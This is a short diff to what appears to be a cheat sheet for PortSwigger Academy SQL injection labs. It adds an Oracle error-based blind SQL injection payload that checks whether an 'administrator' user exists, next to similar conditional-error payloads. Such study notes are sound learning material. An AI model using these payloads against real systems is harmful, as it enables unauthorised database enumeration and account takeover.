@@ -58,6 +58,9 @@ its oracle db
 '||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'    ->  In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true
 <img width="748" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/ffabc5e3-e93d-46d2-96d2-529fa64735e3">
 
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'   -> condition is true, hence error should be received and it confirms administrator user exist in users table.
+<img width="743" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/1cb7b4fc-e1e8-4a2a-aed0-f81d187793c0">
+
  
 ## Summary
 
